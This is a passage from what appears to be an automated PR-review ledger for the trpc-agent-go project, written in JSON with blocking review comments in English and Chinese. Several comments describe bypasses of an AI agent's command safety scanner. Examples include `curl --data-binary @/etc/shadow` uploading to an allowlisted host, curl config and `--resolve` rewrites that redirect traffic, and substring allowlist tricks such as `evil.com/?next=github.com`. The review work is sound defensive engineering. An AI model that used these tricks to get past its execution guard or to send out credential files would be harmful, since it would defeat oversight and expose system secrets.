unknown.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2050#discussion_r3517128457"},{"body":"Denied-path scanning skips all flag tokens, so file operands embedded in options are missed: `@/etc/shadow`, `name=@/etc/shadow`, or `--output=/etc/shadow` never reach `matchesDeniedPath`. An allowlisted network command can therefore upload or overwrite sensitive paths, e.g. `curl --data-binary @/etc/shadow https://github.com/upload`. Please expand path candidates from option values and curl-style upload/file syntaxes before matching denied path patterns.\n\n<details><summary>中文<\/summary>\ndenied-path 扫描会跳过所有 flag token，因此嵌在选项里的文件操作数不会被检查：`@/etc/shadow`、`name=@/etc/shadow`、`--output=/etc/shadow` 都不会进入 `matchesDeniedPath`。这样白名单网络命令仍可以上传或覆盖敏感路径，例如 `curl --data-binary @/etc/shadow https://github.com/upload`。建议从选项值和 curl 上传/文件语法里展开 path candidates，再做 denied path 匹配。\n<\/details>","line":null,"path":"tool/safety/rules.go","summary":"Denied-path scanning skips all flag tokens, so file operands embedded in options are missed: `@/etc/shadow`, `name=@/etc/shadow`, or `--output=/etc/shadow` never reach `matchesDeniedPath`. An allowlisted network command can therefore upload or overwrite sensitive paths, e.g. `curl --data-binary @/etc/shadow https://github.com/upload`. Please expand path candidates from option values and curl-style upload/file syntaxes before matching denied path patterns.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2050#discussion_r3517128459"}],"number":2050,"outcome":"Posted 3 blocking inline comment(s) and submitted request changes.","problem":"Hostexec toolset names, multi-target network commands, and option-embedded sensitive paths still bypass the scanner.","problem_framing":"Hostexec toolset names, multi-target network commands, and option-embedded sensitive paths still bypass the scanner.","review_body":"I found several remaining bypasses in the safety guard wiring and scanners.","review_url":"https://github.com/trpc-group/trpc-agent-go/pull/2050#pullrequestreview-4622363279","risk":"Dangerous hostexec calls or exfil paths can be allowed without scan/audit.","root_cause":"Hostexec toolset names, multi-target network commands, and option-embedded sensitive paths still bypass the scanner.","status":"commented","technical_background":"tool safety permission policy must cover the actual model-visible tool names and all effective network/path operands","tests_docs":"验证方式：GitHub effective checks/head 状态 + 本地 diff/source inspection；仅 #2062 合入前额外跑了本地目标包测试。","title":"feat(tool/safety): add tool execution safety guard","url":"https://github.com/trpc-group/trpc-agent-go/pull/2050"},{"approach":"Verified current curl parser, option handling, and tests, then posted two blockers.","attention_points":"Submitted REQUEST_CHANGES review; review URL: https://github.com/trpc-group/trpc-agent-go/pull/2045#pullrequestreview-4622364111","author":"everfid-ever","ci_state":"checks: pass:162, pending:0, fail:0; merge:BLOCKED; review:CHANGES_REQUESTED","design_assessment":"Verified current curl parser, option handling, and tests, then posted two blockers.","head_sha":"47fbe0f9fa69762442167567276d22da09bfda7d","inline_comments":[{"body":"This only fails closed for explicit `-K/--config`, but curl also reads the implicit default `.curlrc` unless `-q/--disable` is the first curl option. A whitelisted command such as `curl https://github.com/a` can still apply config-supplied `url`, `proxy`, or `resolve` entries and reach a non-whitelisted endpoint without triggering the network rule. Please fail closed/ask for curl unless config loading is disabled first, or otherwise prove the runtime clears curl config; add a regression with `HOME/.curlrc` defining an evil `url`/`resolve`.\n\n<details><summary>中文<\/summary>\n这里只对显式 `-K/--config` fail closed，但 curl 默认还会读取 `.curlrc`，除非第一个 curl option 是 `-q/--disable`。因此 `curl https://github.com/a` 这种白名单命令仍可能被配置文件里的 `url`、`proxy`、`resolve` 改到非白名单 endpoint，网络规则不会发现。建议除非先禁用配置加载，否则 curl 进入 fail closed/ask；或者证明运行环境会清空 curl config，并加一个 `HOME/.curlrc` 配置恶意 `url`/`resolve` 的回归测试。\n<\/details>","line":null,"path":"tool/safety/rules.go","summary":"This only fails closed for explicit `-K/--config`, but curl also reads the implicit default `.curlrc` unless `-q/--disable` is the first curl option. A whitelisted command such as `curl https://github.com/a` can still apply config-supplied `url`, `proxy`, or `resolve` entries and reach a non-whitelisted endpoint without triggering the network rule. Please fail closed/ask for curl unless config loading is disabled first, or otherwise prove the runtime clears curl config; add a regression with `HOME/.curlrc` defining an evil `url`/`resolve`.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2045#discussion_r3517129201"},{"body":"`--resolve github.com:443:2001:db8::1` is accepted by curl, but this helper splits on every colon and drops the unbracketed IPv6 address into non-host fragments. The scanner keeps only the allowlisted `github.com`, so the endpoint rewrite bypasses `R-NET-001`. Please parse `--resolve` with option-specific `host:port:addr[,addr]` logic that preserves the full address tail, including unbracketed IPv6 and `+host` forms, and add deny tests for both.\n\n<details><summary>中文<\/summary>\n`curl --resolve github.com:443:2001:db8::1 ...` 是 curl 接受的格式，但这里按每个冒号切分，会把未加方括号的 IPv6 地址拆碎并丢掉。最终只剩白名单里的 `github.com`，实际 endpoint rewrite 就绕过了 `R-NET-001`。建议针对 `--resolve` 单独解析 `host:port:addr[,addr]`，保留完整 addr tail，包括未加方括号的 IPv6 和 `+host` 形式，并补 deny 测试。\n<\/details>","line":null,"path":"tool/safety/rules.go","summary":"`--resolve github.com:443:2001:db8::1` is accepted by curl, but this helper splits on every colon and drops the unbracketed IPv6 address into non-host fragments. The scanner keeps only the allowlisted `github.com`, so the endpoint rewrite bypasses `R-NET-001`. Please parse `--resolve` with option-specific `host:port:addr[,addr]` logic that preserves the full address tail, including unbracketed IPv6 and `+host` forms, and add deny tests for both.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2045#discussion_r3517129203"}],"number":2045,"outcome":"Posted 2 blocking inline comment(s) and submitted request changes.","problem":"Implicit `.curlrc` and unbracketed IPv6 `--resolve` can still hide non-allowlisted endpoints.","problem_framing":"Implicit `.curlrc` and unbracketed IPv6 `--resolve` can still hide non-allowlisted endpoints.","review_body":"The curl-specific parser fixes several cases, but two bypasses remain.","review_url":"https://github.com/trpc-group/trpc-agent-go/pull/2045#pullrequestreview-4622364111","risk":"A command that appears to target an allowlisted host can route to another endpoint.","root_cause":"Implicit `.curlrc` and unbracketed IPv6 `--resolve` can still hide non-allowlisted endpoints.","status":"commented","technical_background":"curl parsing must fail closed for hidden config and endpoint rewrites","tests_docs":"验证方式：GitHub effective checks/head 状态 + 本地 diff/source inspection；仅 #2062 合入前额外跑了本地目标包测试。","title":"feat: add tool execution safety guard for secure command scanning and…","url":"https://github.com/trpc-group/trpc-agent-go/pull/2045"},{"approach":"Verified guard extraction and policy/network rules, then posted three blockers.","attention_points":"Submitted REQUEST_CHANGES review; review URL: https://github.com/trpc-group/trpc-agent-go/pull/2044#pullrequestreview-4622364997","author":"Nerdlet369","ci_state":"checks: pass:162, pending:0, fail:0; merge:BLOCKED; review:CHANGES_REQUESTED","design_assessment":"Verified guard extraction and policy/network rules, then posted three blockers.","head_sha":"568bdd0afa6ed90e3e5f746242f68b89bd67a0e2","inline_comments":[{"body":"`NewGuard()` only extracts a `command` string, so `tool/codeexec` calls that carry code in `code_blocks` are scanned as empty input and allowed. This leaves one of the documented protected execution paths unguarded. Please JSON-unmarshal arguments into both `command` and `code_blocks`, populate `ScanInput.CodeBlocks`, and add Guard/WrapTool regressions for dangerous `code_blocks`.\n\n<details><summary>中文<\/summary>\n`NewGuard()` 现在只提取 `command` 字段，因此 `tool/codeexec` 这类通过 `code_blocks` 传代码的调用会被当成空输入扫描并允许，文档里声明受保护的一条执行路径实际没有被 guard。建议用 JSON 解析同时提取 `command` 和 `code_blocks`，填充 `ScanInput.CodeBlocks`，并为危险 `code_blocks` 加 Guard/WrapTool 回归测试。\n<\/details>","line":null,"path":"tool/safety/guard.go","summary":"`NewGuard()` only extracts a `command` string, so `tool/codeexec` calls that carry code in `code_blocks` are scanned as empty input and allowed. This leaves one of the documented protected execution paths unguarded. Please JSON-unmarshal arguments into both `command` and `code_blocks`, populate `ScanInput.CodeBlocks`, and add Guard/WrapTool regressions for dangerous `code_blocks`.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2044#discussion_r3517129956"},{"body":"The policy-aware dangerous-command rule consumes `p.DeniedCommands`. The default/sample policy includes network clients like `curl`, so when users follow the recommended scanner wiring, `curl https://github.com/...` is denied by the dangerous-command rule before the network rule can apply `allowed_domains`. That makes the allowlist ineffective. Please keep network clients out of the dangerous-command deny list, split the policy fields by rule, or add scanner-level precedence tests covering both policy constructors.\n\n<details><summary>中文<\/summary>\n带 policy 的 dangerous-command rule 会把 `p.DeniedCommands` 全部并进去。默认/示例 policy 里包含 `curl` 这类网络客户端，用户按推荐方式组装 scanner 后，`curl https://github.com/...` 会先被 dangerous-command rule deny，network rule 的 `allowed_domains` 根本没有机会生效，白名单形同虚设。建议不要把网络客户端放进 dangerous-command deny list，或者按 rule 拆分 policy 字段，并补 scanner-level 测试覆盖两个 policy constructor 一起使用的场景。\n<\/details>","line":null,"path":"tool/safety/rules.go","summary":"The policy-aware dangerous-command rule consumes `p.DeniedCommands`. The default/sample policy includes network clients like `curl`, so when users follow the recommended scanner wiring, `curl https://github.com/...` is denied by the dangerous-command rule before the network rule can apply `allowed_domains`. That makes the allowlist ineffective. Please keep network clients out of the dangerous-command deny list, split the policy fields by rule, or add scanner-level precedence tests covering both policy constructors.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2044#discussion_r3517129961"},{"body":"Allowlist matching is substring-based over the whole command. `evilgithub.com` or `evil.com/?next=github.com` therefore matches an allowed `github.com` pattern and is downgraded to allow/review incorrectly. Please parse URL/host tokens and match exact hosts or valid subdomain suffixes only.\n\n<details><summary>中文<\/summary>\nallowlist 是对整条命令做 substring 匹配，所以 `evilgithub.com` 或 `evil.com/?next=github.com` 会命中允许的 `github.com` pattern，被错误降级为 allow/review。建议解析 URL/host token，只允许精确 host 或合法子域名后缀匹配。\n<\/details>","line":null,"path":"tool/safety/rules.go","summary":"Allowlist matching is substring-based over the whole command. `evilgithub.com` or `evil.com/?next=github.com` therefore matches an allowed `github.com` pattern and is downgraded to allow/review incorrectly. Please parse URL/host tokens and match exact hosts or valid subdomain suffixes only.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2044#discussion_r3517129964"}],"number":2044,"outcome":"Posted 3 blocking inline comment(s) and submitted request changes.","problem":"codeexec `code_blocks`, policy denied command precedence, and substring allowlist matching still undermine the guard.","problem_framing":"codeexec `code_blocks`, policy denied command precedence, and substring allowlist matching still undermine the guard.","review_body":"There are still guard bypasses and a policy-wiring issue that need to be fixed before merge.","review_url":"https://github.com/trpc-group/trpc-agent-go/pull/2044#pullrequestreview-4622364997","risk":"Documented protected paths can be unguarded, and non-allowlisted domains can be treated as allowed.","root_cause":"codeexec `code_blocks`, policy denied command precedence, and substring allowlist matching still undermine the guard.","status":"commented","technical_background":"default safety guard and policy-aware rules must protect documented exec surfaces without weakening allowlist semantics","tests_docs":"验证方式：GitHub effective checks/head 状态 + 本地 diff/source inspection；仅 #2062 合入前额外跑了本地目标包测试。","title":"feat: Tool Safety Scanner with 8 rules and structured audit","url":"https://github.com/trpc-group/trpc-agent-go/pull/2044"},{"approach":"Verified the current transaction branch and posted a blocker on the empty hard-delete branch.","attention_points":"Submitted REQUEST_CHANGES review; review URL: https://github.com/trpc-group/trpc-agent-go/pull/2017#pullrequestreview-4622365570","author":"shanghai-Jerry","ci_state":"checks: pass:162, pending:0, fail:0; merge:BLOCKED; review:CHANGES_REQUESTED","design_assessment":"Verified the current transaction branch and posted a blocker on the empty hard-delete branch.","head_sha":"27d1686b4c5f6a0841dddf5104713c64828f1d1f","inline_comments":[{"body":"This branch detects a soft-deleted target row in hard-delete mode, but it never removes that row before the later plain `INSERT`. If `newID` points to a residual soft-deleted row, the function deletes the source and then hits a duplicate primary key on insert, instead of the documented \"physically removed before INSERT\" behavior. Please delete the locked target row in the `!s.opts.softDelete` branch, or return a conflict before modifying the source; add a hard-delete test where the pre-check returns `active=false`.\n\n<details><summary>中文<\/summary>\n这个分支已经检测到了 hard-delete 模式下的 soft-deleted target row，但后面 plain `INSERT` 前并没有把这行删掉。如果 `newID` 指向一条残留的 soft-deleted 行，函数会先删除 source，然后插入时撞 primary key，而不是注释里说的 “physically removed before INSERT”。建议在 `!s.opts.softDelete` 分支里删除这条已锁定的 target row，或者在修改 source 前直接返回 conflict；同时补一个 pre-check 返回 `active=false` 的 hard-delete 测试。\n<\/details>","line":null,"path":"memory/mysqlvec/service.go","summary":"This branch detects a soft-deleted target row in hard-delete mode, but it never removes that row before the later plain `INSERT`. If `newID` points to a residual soft-deleted row, the function deletes the source and then hits a duplicate primary key on insert, instead of the documented \"physically removed before INSERT\" behavior. Please delete the locked target row in the `!s.opts.softDelete` branch, or return a conflict before modifying the source; add a hard-delete test where the pre-check returns `active=false`.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2017#discussion_r3517130452"}],"number":2017,"outcome":"Posted 1 blocking inline comment(s) and submitted request changes.","problem":"Hard-delete mode detects a residual soft-deleted target but does not remove it before plain INSERT.","problem_framing":"Hard-delete mode detects a residual soft-deleted target but does not remove it before plain INSERT.","review_body":"The active-row and `RowsAffected` issues are fixed, but hard-delete mode still has a duplicate-key path.","review_url":"https://github.com/trpc-group/trpc-agent-go/pull/2017#pullrequestreview-4622365570","risk":"The source row can be deleted and then the insert can fail with duplicate key.","root_cause":"Hard-delete mode detects a residual soft-deleted target but does not remove it before plain INSERT.","status":"commented","technical_background":"mysqlvec rotateMemory must handle soft-deleted target rows correctly in both soft-delete and hard-delete modes","tests_docs":"验证方式：GitHub effective checks/head 状态 + 本地 diff/source inspection；仅 #2062 合入前额外跑了本地目标包测试。","title":"fix: use UPDATE instead of DELETE for soft delete in rotateMemory","url":"https://github.com/trpc-group/trpc-agent-go/pull/2017"},{"approach":"Verified the current case and issue-closure claim, then posted a blocking inline review.","attention_points":"Submitted REQUEST_CHANGES review; review URL: https://github.com/trpc-group/trpc-agent-go/pull/2049#pullrequestreview-4622366095","author":"Spock12138","ci_state":"checks: pass:162, pending:0, fail:0; merge:BLOCKED; review:CHANGES_REQUESTED","design_assessment":"Verified the current case and issue-closure claim, then posted a blocking inline review.","head_sha":"b4f0555811d13e823615d1d5df1f5fedec10f916","inline_comments":[{"body":"`concurrent_retry_writes` launches four successful `AddMemory` calls, including two independent duplicate-content writes, and only asserts that search returns at least two results. It does not inject a retry, an error, or a backend anomaly, so a backend that creates duplicate memory on retry would still pass while this PR claims to close #2001. Please add a real retry/anomaly case that proves the diff report catches duplicate retry effects, or explicitly scope retry/idempotency out of this PR and linked issue closure.\n\n<details><summary>中文<\/summary>\n`concurrent_retry_writes` 只是发起四个成功的 `AddMemory`，其中两次是独立的重复内容写入，然后只断言搜索至少返回两个结果。它没有注入 retry、error 或后端异常，因此一个“重试时产生重复 memory”的后端仍然会通过，但 PR 又声称要关闭 #2001。建议增加真正的 retry/anomaly 用例，证明 diff report 能抓到重试重复写；或者明确把 retry/idempotency 从本 PR 和关联 issue 的关闭范围里移出去。\n<\/details>","line":null,"path":"test/replay_consistency_test.go","summary":"`concurrent_retry_writes` launches four successful `AddMemory` calls, including two independent duplicate-content writes, and only asserts that search returns at least two results. It does not inject a retry, an error, or a backend anomaly, so a backend that creates duplicate memory on retry would still pass while this PR claims to close #2001. Please add a real retry/anomaly case that proves the diff report catches duplicate retry effects, or explicitly scope retry/idempotency out of this PR and linked issue closure.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2049#discussion_r3517130918"}],"number":2049,"outcome":"Posted 1 blocking inline comment(s) and submitted request changes.","problem":"`concurrent_retry_writes` uses successful duplicate-content writes and does not validate retry recovery.","problem_framing":"`concurrent_retry_writes` uses successful duplicate-content writes and does not validate retry recovery.","review_body":"The previous SummaryBoundary concern is addressed, but the new retry case does not yet validate retry/idempotency behavior.","review_url":"https://github.com/trpc-group/trpc-agent-go/pull/2049#pullrequestreview-4622366095","risk":"A backend that creates duplicate memory on retry can still pass while the PR claims to close the retry issue.","root_cause":"`concurrent_retry_writes` uses successful duplicate-content writes and does not validate retry recovery.","status":"commented","technical_background":"replay consistency harness should only claim retry/idempotency coverage when it exercises a real retry/anomaly path","tests_docs":"验证方式：GitHub effective checks/head 状态 + 本地 diff/source inspection；仅 #2062 合入前额外跑了本地目标包测试。","title":"test: add replay consistency harness","url":"https://github.com/trpc-group/trpc-agent-go/pull/2049"},{"approach":"Verified approval_service.go, then posted three blockers.","attention_points":"Submitted REQUEST_CHANGES review; review URL: https://github.com/trpc-group/trpc-agent-go/pull/2041#pullrequestreview-4622367301","author":"Rememorio","ci_state":"checks: pass:162, pending:0, fail:0; merge:BLOCKED; review:CHANGES_REQUESTED","design_assessment":"Verified approval_service.go, then posted three blockers.","head_sha":"cde8ca25dbf974fcf69f008adfbed17989ff4ee5","inline_comments":[{"body":"`approvalDecisionLocks` is process-local, but the real approval paths can run in different processes: the `openclaw evolution approve/reject` CLI and the runtime sweeper can both read `pending_approval` and then publish/write conflicting decisions. The serialization/CAS needs to live in the `CandidateStore` layer or a filesystem lock per revision, with status re-read under that lock and `ErrAlreadyDecided` returned before publishing if the status changed.\n\n<details><summary>中文<\/summary>\n`approvalDecisionLocks` 只是进程内锁，但真实路径里 CLI 的 `openclaw evolution approve/reject` 和 runtime sweeper 可能在不同进程中运行，二者仍然可以同时读到 `pending_approval`，随后 publish/write 出相互冲突的决策。这里需要把序列化/CAS 放到 `CandidateStore` 层，或者用按 revision 的文件锁；在锁内重读状态，如果已经变化，要在 publish 前返回 `ErrAlreadyDecided`。\n<\/details>","line":null,"path":"evolution/approval_service.go","summary":"`approvalDecisionLocks` is process-local, but the real approval paths can run in different processes: the `openclaw evolution approve/reject` CLI and the runtime sweeper can both read `pending_approval` and then publish/write conflicting decisions. The serialization/CAS needs to live in the `CandidateStore` layer or a filesystem lock per revision, with status re-read under that lock and `ErrAlreadyDecided` returned before publishing if the status changed.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2041#discussion_r3517131847"},{"body":"Even within one process, this key serializes by revision, not by skill. Two pending revisions for the same skill can be promoted concurrently and race over the publisher, archive, and active pointer, which can leave the older revision active or archive a newer human-approved revision. Please serialize state-changing approval/rollback operations per `SkillID`, or make active-pointer updates transactional with revision status changes.\n\n<details><summary>中文<\/summary>\n即使只看单进程，这个 key 也是按 revision 串行，而不是按 skill 串行。同一个 skill 的两个 pending revision 仍可能并发 promote，并在 publisher、archive、active pointer 上竞争，可能导致旧 revision 变成 active，或把更新的人审 revision archive 掉。建议按 `SkillID` 串行所有会改状态的 approve/rollback，或者把 active pointer 更新和 revision 状态变更做成事务。\n<\/details>","line":null,"path":"evolution/approval_service.go","summary":"Even within one process, this key serializes by revision, not by skill. Two pending revisions for the same skill can be promoted concurrently and race over the publisher, archive, and active pointer, which can leave the older revision active or archive a newer human-approved revision. Please serialize state-changing approval/rollback operations per `SkillID`, or make active-pointer updates transactional with revision status changes.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2041#discussion_r3517131851"},{"body":"Rollback still has a pointer/status consistency failure mode. If `pointer.Set` or `pointer.Clear` fails after `archiveActive` and writing the restored revision active, the previous active revision is already archived while the pointer can still reference it. Please either update pointer/status atomically or restore both current and target revision statuses on pointer failure, and add tests for `Set` and `Clear` failures.\n\n<details><summary>中文<\/summary>\nrollback 仍有 pointer/status 不一致的问题：如果 `archiveActive` 以及写入 restored revision active 之后，`pointer.Set` 或 `pointer.Clear` 失败，之前的 active revision 已经被 archive，但 pointer 可能仍指向它。建议把 pointer/status 原子更新，或者在 pointer 失败时同时恢复 current 和 target revision 状态，并补 `Set` / `Clear` 失败测试。\n<\/details>","line":null,"path":"evolution/approval_service.go","summary":"Rollback still has a pointer/status consistency failure mode. If `pointer.Set` or `pointer.Clear` fails after `archiveActive` and writing the restored revision active, the previous active revision is already archived while the pointer can still reference it. Please either update pointer/status atomically or restore both current and target revision statuses on pointer failure, and add tests for `Set` and `Clear` failures.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2041#discussion_r3517131852"}],"number":2041,"outcome":"Posted 3 blocking inline comment(s) and submitted request changes.","problem":"The new lock is process-local and revision-scoped, and rollback can leave pointer/status inconsistent on pointer failure.","problem_framing":"The new lock is process-local and revision-scoped, and rollback can leave pointer/status inconsistent on pointer failure.","review_body":"The new in-process locking does not fully close the approval/rollback consistency issues.","review_url":"https://github.com/trpc-group/trpc-agent-go/pull/2041#pullrequestreview-4622367301","risk":"CLI, sweeper, and rollback paths can publish conflicting decisions or leave active pointers stale.","root_cause":"The new lock is process-local and revision-scoped, and rollback can leave pointer/status inconsistent on pointer failure.","status":"commented","technical_background":"evolution approval and rollback state transitions must be process-safe and pointer/status consistent","tests_docs":"验证方式：GitHub effective checks/head 状态 + 本地 diff/source inspection；仅 #2062 合入前额外跑了本地目标包测试。","title":"{evolution, openclaw, docs}: add rollback API and pending_approval auto-expire","url":"https://github.com/trpc-group/trpc-agent-go/pull/2041"},{"approach":"Verified `AppendEvent` cleanup and `appendObserved` logic, then posted two blockers.","attention_points":"Submitted REQUEST_CHANGES review; review URL: https://github.com/trpc-group/trpc-agent-go/pull/2034#pullrequestreview-4622368440","author":"hr-chang","ci_state":"checks: pass:162, pending:0, fail:0; merge:BLOCKED; review:CHANGES_REQUESTED","design_assessment":"Verified `AppendEvent` cleanup and `appendObserved` logic, then posted two blockers.","head_sha":"92634837b16bfd358ff6199245abc33fafbcd65a","inline_comments":[{"body":"If an `AppendEventHook` calls `next()` and then returns an error, the event may already be persisted with `ContentRef`, but this error branch deletes the saved artifacts anyway. The persisted event then points to deleted artifacts and later hydration fails. Please only cleanup when append is known not to have reached storage; if the result is ambiguous, leaving orphan artifacts is safer than deleting referenced artifacts.\n\n<details><summary>中文<\/summary>\n如果 `AppendEventHook` 先调用了 `next()`，随后返回 error，事件可能已经带着 `ContentRef` 持久化了，但这里的错误分支仍会删除刚保存的 artifacts。这样持久化事件会指向已删除的 artifact，后续 hydrate 会失败。建议只在确定 append 没有进入存储时 cleanup；如果无法确定，保留孤儿 artifact 比删除仍被引用的 artifact 更安全。\n<\/details>","line":null,"path":"internal/session/externalization/service.go","summary":"If an `AppendEventHook` calls `next()` and then returns an error, the event may already be persisted with `ContentRef`, but this error branch deletes the saved artifacts anyway. The persisted event then points to deleted artifacts and later hydration fails. Please only cleanup when append is known not to have reached storage; if the result is ambiguous, leaving orphan artifacts is safer than deleting referenced artifacts.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2034#discussion_r3517132746"},{"body":"`appendObserved` uses the cloned runtime session's visible `Events` as the persistence signal, but `UpdateUserSession` can filter that view to empty when there is no user message even though the backend persisted the event. First system/assistant/direct appended multimodal events can therefore persist dangling `ContentRef`s and break `GetEventWindow` / `SearchEvents` with artifact-not-found. Please replace this with a real persisted/next-called signal, or stop deleting artifacts on this ambiguous path; add regression coverage for a first non-user externalized event.\n\n<details><summary>中文<\/summary>\n`appendObserved` 用 cloned runtime session 里可见的 `Events` 判断是否持久化，但当没有 user message 时，`UpdateUserSession` 可能把这个视图过滤为空，即使后端已经写入了事件。这样首个 system/assistant/direct append 的 multimodal event 可能留下悬空 `ContentRef`，导致 `GetEventWindow` / `SearchEvents` hydrate 时 artifact-not-found。建议改成真实的 persisted/next-called 信号，或者在这个歧义路径上不要删除 artifacts；并补一个首个非 user externalized event 的回归测试。\n<\/details>","line":null,"path":"internal/session/externalization/service.go","summary":"`appendObserved` uses the cloned runtime session's visible `Events` as the persistence signal, but `UpdateUserSession` can filter that view to empty when there is no user message even though the backend persisted the event. First system/assistant/direct appended multimodal events can therefore persist dangling `ContentRef`s and break `GetEventWindow` / `SearchEvents` with artifact-not-found. Please replace this with a real persisted/next-called signal, or stop deleting artifacts on this ambiguous path; add regression coverage for a first non-user externalized event.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2034#discussion_r3517132747"}],"number":2034,"outcome":"Posted 2 blocking inline comment(s) and submitted request changes.","problem":"Append hooks and filtered runtime views make cleanup ambiguous after a persisted append.","problem_framing":"Append hooks and filtered runtime views make cleanup ambiguous after a persisted append.","review_body":"I found a remaining cleanup/persistence ambiguity that can leave persisted events pointing to deleted artifacts.","review_url":"https://github.com/trpc-group/trpc-agent-go/pull/2034#pullrequestreview-4622368440","risk":"Hydration can fail because persisted events point to deleted artifacts.","root_cause":"Append hooks and filtered runtime views make cleanup ambiguous after a persisted append.","status":"commented","technical_background":"session externalization must not delete artifacts that a persisted event may already reference","tests_docs":"验证方式：GitHub effective checks/head 状态 + 本地 diff/source inspection；仅 #2062 合入前额外跑了本地目标包测试。","title":"{model, runner, internal/session}: add session multimodal externalization","url":"https://github.com/trpc-group/trpc-agent-go/pull/2034"}],"follow_up":["继续关注 #2064/#2051/#2050/#2045/#2044/#2017/#2049/#2041/#2034 的作者修复；下一轮应优先刷新这些 comment fingerprint。","锁定 PR #1400/#1183 仍需显式 comment-delivery 风险处理。","本轮 bulk GraphQL/statusCheckRollup 仍不稳定，fallback collector 和 review URL finalizer 应产品化。"],"generated_at":"2026-07-03T02:43:40.582Z","incremental_plan":{"closed_or_missing":[{"author":"Flash-LHR","number":2048,"previo sion status changes.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2041#discussion_r3517131851"},{"kind":"review_comment","line":null,"path":"evolution/approval_service.go","summary":"Rollback still has a pointer/status consistency failure mode. If `pointer.Set` or `pointer.Clear` fails after `archiveActive` and writing the restored revision active, the previous active revision is already archived while the pointer can still reference it. Please either update pointer/status atomically or restore both current and target revision statuses on pointer failure, and add tests for `Set` and `Clear` failures.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2041#discussion_r3517131852"}],"check_summary":{"failed":0,"non_green":[],"passed":162,"pending":0,"skipped":0,"total":162},"checks_fingerprint":"676729a39d7ef1795021aa9a","comments_fingerprint":"mycr-review-https://github.com/trpc-group/trpc-agent-go/pull/2041#pullrequestreview-4622367301","files_summary":{"additions":3106,"changedFiles":25,"deletions":94},"head_ref":"evolution_rollback_autoexpire","head_repository_owner":"Rememorio","head_sha":"cde8ca25dbf974fcf69f008adfbed17989ff4ee5","is_draft":false,"is_wip":false,"labels":[],"last_action":"commented","last_heavy_reviewed_head_sha":"cde8ca25dbf974fcf69f008adfbed17989ff4ee5","last_verified_at":"2026-07-03T02:43:40.582Z","latest_activity_at":"2026-07-02T13:26:48Z","ledger_bucket":"blocked","locked":false,"maintainer_can_modify":true,"merge_state_status":"BLOCKED","mergeable":"BLOCKED","metadata_cache_key":"b068854f55e9ce1633acdc2c","number":2041,"planning_reasons":["head_sha_changed","checks_changed","review_threads_changed","comments_changed","updated_after_watermark"],"review_decision":"CHANGES_REQUESTED","review_threads_fingerprint":"mycr-review-https://github.com/trpc-group/trpc-agent-go/pull/2041#pullrequestreview-4622367301","state":"OPEN","title":"{evolution, openclaw, docs}: add rollback API and pending_approval auto-expire","updated_at":"2026-07-02T13:26:48Z","url":"https://github.com/trpc-group/trpc-agent-go/pull/2041"},"2044":{"active_lock_reason":"","author":"Nerdlet369","base_ref":"main","blockers":[{"kind":"review_comment","line":null,"path":"tool/safety/guard.go","summary":"`NewGuard()` only extracts a `command` string, so `tool/codeexec` calls that carry code in `code_blocks` are scanned as empty input and allowed. This leaves one of the documented protected execution paths unguarded. Please JSON-unmarshal arguments into both `command` and `code_blocks`, populate `ScanInput.CodeBlocks`, and add Guard/WrapTool regressions for dangerous `code_blocks`.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2044#discussion_r3517129956"},{"kind":"review_comment","line":null,"path":"tool/safety/rules.go","summary":"The policy-aware dangerous-command rule consumes `p.DeniedCommands`. The default/sample policy includes network clients like `curl`, so when users follow the recommended scanner wiring, `curl https://github.com/...` is denied by the dangerous-command rule before the network rule can apply `allowed_domains`. That makes the allowlist ineffective. Please keep network clients out of the dangerous-command deny list, split the policy fields by rule, or add scanner-level precedence tests covering both policy constructors.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2044#discussion_r3517129961"},{"kind":"review_comment","line":null,"path":"tool/safety/rules.go","summary":"Allowlist matching is substring-based over the whole command. `evilgithub.com` or `evil.com/?next=github.com` therefore matches an allowed `github.com` pattern and is downgraded to allow/review incorrectly. Please parse URL/host tokens and match exact hosts or valid subdomain suffixes only.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2044#discussion_r3517129964"}],"check_summary":{"failed":0,"non_green":[],"passed":162,"pending":0,"skipped":0,"total":162},"checks_fingerprint":"676729a39d7ef1795021aa9a" 3517129201"},{"kind":"review_comment","line":null,"path":"tool/safety/rules.go","summary":"`--resolve github.com:443:2001:db8::1` is accepted by curl, but this helper splits on every colon and drops the unbracketed IPv6 address into non-host fragments. The scanner keeps only the allowlisted `github.com`, so the endpoint rewrite bypasses `R-NET-001`. Please parse `--resolve` with option-specific `host:port:addr[,addr]` logic that preserves the full address tail, including unbracketed IPv6 and `+host` forms, and add deny tests for both.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2045#discussion_r3517129203"}],"check_summary":{"failed":0,"non_green":[],"passed":162,"pending":0,"skipped":0,"total":162},"checks_fingerprint":"676729a39d7ef1795021aa9a","comments_fingerprint":"mycr-review-https://github.com/trpc-group/trpc-agent-go/pull/2045#pullrequestreview-4622364111","files_summary":{"additions":4721,"changedFiles":37,"deletions":0},"head_ref":"feat/tool_safety","head_repository_owner":"everfid-ever","head_sha":"47fbe0f9fa69762442167567276d22da09bfda7d","is_draft":false,"is_wip":false,"labels":[],"last_action":"commented","last_heavy_reviewed_head_sha":"47fbe0f9fa69762442167567276d22da09bfda7d","last_verified_at":"2026-07-03T02:43:40.582Z","latest_activity_at":"2026-07-02T13:29:19Z","ledger_bucket":"blocked","locked":false,"maintainer_can_modify":true,"merge_state_status":"BLOCKED","mergeable":"BLOCKED","metadata_cache_key":"2164460da06fcf19b440275f","number":2045,"planning_reasons":["head_sha_changed","checks_changed","review_threads_changed","comments_changed","updated_after_watermark"],"review_decision":"CHANGES_REQUESTED","review_threads_fingerprint":"mycr-review-https://github.com/trpc-group/trpc-agent-go/pull/2045#pull